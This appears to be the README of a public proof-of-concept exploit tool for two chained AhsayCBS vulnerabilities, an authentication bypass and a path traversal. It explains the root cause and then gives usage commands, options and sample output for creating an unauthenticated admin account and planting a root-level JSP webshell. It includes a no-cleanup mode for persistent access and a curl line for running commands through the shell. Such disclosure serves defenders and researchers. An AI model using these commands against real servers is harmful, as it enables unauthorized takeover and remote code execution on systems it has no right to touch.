# AhsayCBS Authentication Bypass & RCE

**CVE-2026-105133 + CVE-2026-105134** — Unauthenticated remote code execution in AhsayCBS ≤10.3.4

## Blog Post

Technical analysis covering root cause, exploitation, and indicators of compromise is available on the Horizon3.ai attack research blog:

[https://horizon3.ai/attack-research/attack-blogs/ahsaycbs-cve-2026-105133-cve-2026-105134-technical-analysis/](https://horizon3.ai/attack-research/attack-blogs/ahsaycbs-cve-2026-105133-cve-2026-105134-technical-analysis/)

## Overview

AhsayCBS versions 10.3.4 and earlier are vulnerable to **unauthenticated remote code execution** via two chained authentication bypass and path traversal flaws in the JSON API and replication receiver modules. An attacker can achieve full administrative control or direct RCE without credentials.

### Vulnerability Details

#### CVE-2026-105133: Authentication Bypass in JSON API

The `com.ahsay.obs.api.json.JSONApi.execute()` method skips the `checkSysPwd()` credential validation when the JSON request body contains `{"FromServlet":"Y"}`. This allows any unauthenticated attacker to invoke every JSON API action without credentials.

**Impact:** Unauthenticated JSON API access to sensitive operations.

#### CVE-2026-105134: Path Traversal in Replication Upload

The replication receiver file upload endpoint (`PUT /rps/obs7/rpsfile/upload`) constructs the write path from attacker-controlled `UserHome` and `TopDir` headers via `getReplicatedPath()` **without** applying the `com.ahsay.c` path denylist. An attacker can traverse into Tomcat's web-served directory (`../../webapps/`) to upload executable JSP files.

## Exploitation Modes

### Mode 1: Admin Takeover (Default)

Uses the authentication bypass to create a new system administrator account. Works on any AhsayCBS installation, regardless of licensing or replication configuration.

```bash
python3 ahsay_rce_poc.py --url https://target.example.com
```

**Output:**
```
AhsayCBS <=10.3.4 unauthenticated takeover (CVE-2026-105133 + CVE-2026-105134)
[*] Target: https://target.example.com
[*] Checking authentication bypass (CVE-2026-105133)...
[+] Target is VULNERABLE: auth check is skipped with FromServlet=Y
[*] Creating ADMIN account 'svc_abcdef' via AddSysUser (unauthenticated)...
[+] Created system user 'svc_abcdef' (Role=ADMIN)
[+] Confirmed: the account authenticates as a functional ADMIN

[+] Admin credentials
      Console : https://target.example.com/cbs/
      Username: svc_abcdef
      Password: TK$#m9q@2pL!xR4vN
      Role    : ADMIN

[*] Cleaning up...
[+] Removed admin account 'svc_abcdef'
[+] Done.
```

### Mode 2: Replication RCE (--replication)

Uses the path traversal in the replication receiver to upload an authenticated webshell. Requires the target to be licensed and configured as a replication receiver. Achieves RCE as the service account.

```bash
python3 ahsay_rce_poc.py --url https://target.example.com --replication --cmd id
```

**Output:**
```
AhsayCBS <=10.3.4 unauthenticated takeover (CVE-2026-105133 + CVE-2026-105134)
[*] Target: https://target.example.com
[*] Checking authentication bypass (CVE-2026-105133)...
[+] Target is VULNERABLE: auth check is skipped with FromServlet=Y
[+] Created replication receiver 'rqxmouq' (SystemHome=/opt/AhsayCBS/rpsrecv_ggsrer)
[+] Uploaded webshell -> /rps/status_vomejx.jsp (auth-gated)
[*] Webshell: https://target.example.com/rps/status_vomejx.jsp?auth=d9facce9a7e9535aab16270e36bf7527
[+] Remote code execution confirmed:
      uid=0(root) gid=0(root) groups=0(root)
[*] Running: id
uid=0(root) gid=0(root) groups=0(root)
[*] Cleaning up...
[+] Removed webshell /rps/status_vomejx.jsp
[+] Removed receiver 'rqxmouq' (Id=2)
[+] Done.
```

## Installation

```bash
pip install requests
```

## Usage

### Basic Detection

Test if the target is vulnerable without making any changes:

```bash
python3 ahsay_rce_poc.py --url https://target.example.com --check
```

### Admin Takeover

Create a new administrative account:

```bash
# Auto-generated credentials (default)
python3 ahsay_rce_poc.py --url https://target.example.com

# Custom username and password
python3 ahsay_rce_poc.py --url https://target.example.com \
  --admin-user admin_user \
  --admin-pass 'P@ssw0rd123'

# Custom role (default: ADMIN)
python3 ahsay_rce_poc.py --url https://target.example.com --role OPERATOR
```

### Replication RCE

Execute commands via a temporary webshell:

```bash
# Execute 'id' command
python3 ahsay_rce_poc.py --url https://target.example.com --replication --cmd id

# Interactive webshell (use --no-cleanup to keep the shell)
python3 ahsay_rce_poc.py --url https://target.example.com --replication \
  --no-cleanup \
  --secret mysecret123 \
  --shell-name cmd.jsp

# Then access via:
# curl 'https://target.example.com/rps/cmd.jsp?auth=mysecret123&cmd=whoami'
```

### Additional Options

```
General:
  -u, --url URL              Target base URL (required)
  -t, --timeout SECONDS      HTTP timeout (default: 30)
  -k, --insecure            Ignore TLS cert errors (default: on)
  --check                   Detect vulnerability without exploitation
  --no-cleanup              Leave artifacts in place for further access

Admin Takeover:
  --admin-user USER         Username to create (default: random)
  --admin-pass PASS         Password to set (default: random strong)
  --role ROLE               User role: ADMIN, OPERATOR, etc. (default: ADMIN)

Replication RCE:
  --replication             Use replication RCE mode (requires licensed receiver)
  -c, --cmd COMMAND         Command to execute
  -r, --install-root PATH   AhsayCBS install directory (default: /opt/AhsayCBS)
  -w, --webapp NAME         Web app to upload JSP into (default: rps)
  --secret HEX              Webshell auth secret (default: random)
  --shell-name NAME         Webshell filename (default: random)
```

## Follow Horizon3.ai Attack Team for Latest Security Research

* [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)

## Disclaimer

"This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized." Project maintainers assume no liability for misuse. Use responsibly.

